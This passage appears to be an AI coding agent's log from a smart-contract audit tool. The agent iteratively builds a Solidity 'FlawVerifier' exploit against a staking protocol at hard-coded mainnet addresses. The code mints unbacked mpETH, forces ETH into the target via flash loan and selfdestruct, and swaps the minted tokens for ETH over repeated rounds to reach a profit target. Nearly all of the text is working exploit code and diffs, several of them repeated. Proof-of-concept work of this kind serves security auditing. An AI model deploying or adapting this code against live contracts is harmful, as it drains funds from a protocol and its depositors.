++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+exec
+/bin/bash -lc 'cat FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+codex
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+interface ILiquidUnstakePoolLike {
+    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
+    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256 amountOut);
+}
+
+interface IFlashLoanRecipient {
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IBalancerVault {
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract ForceEther {
+    constructor() payable {}
+
+    function boom(address payable target) external {
+        selfdestruct(target);
+    }
+}
+
+contract FlawVerifier is IFlashLoanRecipient {
+    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    uint256 internal constant MIN_SHARES = 0.01 ether;
+    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+    uint256 internal constant MIN_REQUIRED_PROFIT = 1;
+    uint256 internal constant MAX_ROUNDS = 8;
+
+    address internal realizedProfitToken;
+    uint256 internal realizedProfitAmount;
+
+    constructor() payable {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        uint256 nativeBefore = address(this).balance;
+
+        // exploit_paths[1]: read `liquidUnstakePool()` from `TARGET_PROXY`.
+        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
+        require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+        require(liquidPool.balance != 0, "liquid pool has no ETH");
+
+        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
+        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
+        // same mint->approve->swap path and size each round against current pool inventory.
+        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
+            if (liquidPool.balance < MIN_SHARES) {
+                break;
+            }
+
+            uint256 roundStart = address(this).balance;
+            uint256 bestAmount = _findBestMintAmount(liquidPool);
+            if (bestAmount < MIN_SHARES) {
+                break;
+            }
+
+            bool success = _tryCandidateSeries(liquidPool, bestAmount);
+            if (!success) {
+                break;
+            }
+
+            if (address(this).balance <= roundStart) {
+                break;
+            }
+
+            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                break;
+            }
+        }
+
+        realizedProfitToken = address(0);
+        realizedProfitAmount = address(this).balance - nativeBefore;
+        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "no net ETH profit realized");
+    }
+
+    function attemptCandidate(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+
+        // First try the exploit exactly as claimed: mint first, without funding assets.
+        try this.attemptWithoutTopUp(liquidPool, desiredShares) {
+            return;
+        } catch {}
+
+        // If the inherited mint path still assumes some ETH is already parked on the target,
+        // use a realistic public funding step as a fallback. The top-up remains causally prior
+        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
+        uint256 shortfall = _fundingShortfallHint(desiredShares);
+        require(shortfall != 0, "candidate failed without top-up");
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+        require(quoteOk && quotedOut > 1, "candidate has no repayable swap quote");
+
+        if (shortfall >= quotedOut) {
+            shortfall = quotedOut - 1;
+        }
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        tokens[0] = IERC20Like(WETH);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = shortfall;
+
+        // exploit_paths[2]: optionally top up `TARGET_PROXY` with forced ETH to satisfy internal
+        // execution assumptions, using only public capital sourced in this transaction.
+        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(liquidPool, desiredShares));
+    }
+
+    function attemptWithoutTopUp(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+        _executePath(liquidPool, desiredShares, 0, 0);
+    }
+
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external override {
+        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
+        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
+        require(address(tokens[0]) == WETH, "unexpected flashloan token");
+
+        (address liquidPool, uint256 desiredShares) = abi.decode(userData, (address, uint256));
+
+        IWETH(WETH).withdraw(amounts[0]);
+        _executePath(liquidPool, desiredShares, amounts[0], feeAmounts[0]);
+
+        uint256 repayment = amounts[0] + feeAmounts[0];
+        require(address(this).balance >= repayment, "swap proceeds cannot repay flashloan");
+
+        IWETH(WETH).deposit{value: repayment}();
+        _safeTransfer(WETH, BALANCER_VAULT, repayment);
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
+        uint256[8] memory candidates = [
+            seedAmount,
+            (seedAmount * 7) / 8,
+            (seedAmount * 3) / 4,
+            (seedAmount * 2) / 3,
+            seedAmount / 2,
+            seedAmount / 3,
+            seedAmount / 4,
+            MIN_SHARES
+        ];
+
+        uint256 previousCandidate;
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 candidate = candidates[i];
+            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+                continue;
+            }
+
+            previousCandidate = candidate;
+            try this.attemptCandidate(liquidPool, candidate) {
+                return true;
+            } catch {}
+        }
+    }
+
+    function _executePath(
+        address liquidPool,
+        uint256 desiredShares,
+        uint256 temporaryEth,
+        uint256 flashloanFee
+    ) internal {
+        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));
+        require(liquidPool != address(0), "liquid pool missing");
+
+        if (temporaryEth != 0) {
+            ForceEther helper = new ForceEther{value: temporaryEth}();
+            helper.boom(payable(TARGET_PROXY));
+        }
+
+        // exploit_paths[3]: call `mint(desiredShares, address(this))` without first transferring
+        // backing assets through the ordinary deposit flow.
+        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));
+
+        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
+        require(mintedShares != 0, "mint path produced zero mpETH");
+
+        // exploit_paths[4]: approve the freshly minted mpETH to the liquid unstake pool.
+        _safeApprove(TARGET_PROXY, liquidPool, 0);
+        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
+        require(quoteOk && quotedOut != 0, "getAmountOut(uint256) unavailable after mint");
+        require(quotedOut > flashloanFee, "quote cannot even cover flashloan fee");
+
+        uint256 nativeBeforeSwap = address(this).balance;
+
+        // exploit_paths[5]: call `swapmpETHforETH()` to convert the unbacked mpETH into ETH.
+        uint256 amountOut = ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, 0);
+
+        uint256 nativeDelta = address(this).balance - nativeBeforeSwap;
+        require(nativeDelta != 0, "swap returned zero ETH");
+        require(amountOut == nativeDelta, "swap return mismatch");
+
+        if (temporaryEth != 0) {
+            require(nativeDelta > temporaryEth + flashloanFee, "top-up branch is not profitable");
+        }
+    }
+
+    function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+        uint256 poolEth = liquidPool.balance;
+        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
+            return 0;
+        }
+
+        uint256[10] memory probes = [
+            poolHeldShares,
+            (poolHeldShares * 7) / 8,
+            (poolHeldShares * 3) / 4,
+            (poolHeldShares * 2) / 3,
+            poolHeldShares / 2,
+            poolHeldShares / 3,
+            poolHeldShares / 4,
+            poolHeldShares / 8,
+            poolHeldShares / 16,
+            MIN_SHARES
+        ];
+
+        uint256 bestEstimatedProfit;
+        uint256 previousProbe;
+
+        for (uint256 i = 0; i < probes.length; ++i) {
+            uint256 probe = probes[i];
+            if (probe < MIN_SHARES || probe == previousProbe) {
+                continue;
+            }
+
+            previousProbe = probe;
+
+            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
+            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
+                continue;
+            }
+
+            uint256 shortfall = _fundingShortfallHint(probe);
+            if (shortfall >= quotedOut) {
+                continue;
+            }
+
+            uint256 estimatedProfit = quotedOut - shortfall;
+            if (estimatedProfit > bestEstimatedProfit) {
+                bestEstimatedProfit = estimatedProfit;
+                bestAmount = probe;
+            }
+        }
+    }
+
+    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
+        if (desiredShares == 0) {
+            return 0;
+        }
+
+        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+            uint256 targetNativeBalance = TARGET_PROXY.balance;
+            if (ethNeeded > targetNativeBalance) {
+                shortfall = ethNeeded - targetNativeBalance;
+            }
+        } catch {
+            shortfall = 0;
+        }
+    }
+
+    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
+        try ILiquidUnstakePoolLike(liquidPool).getAmountOut(amountIn) returns (uint256 quotedOut, uint256) {
+            return (true, quotedOut);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
+        );
+        if (ok && data.length >= 32) {
+            balance = abi.decode(data, (uint256));
+        }
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
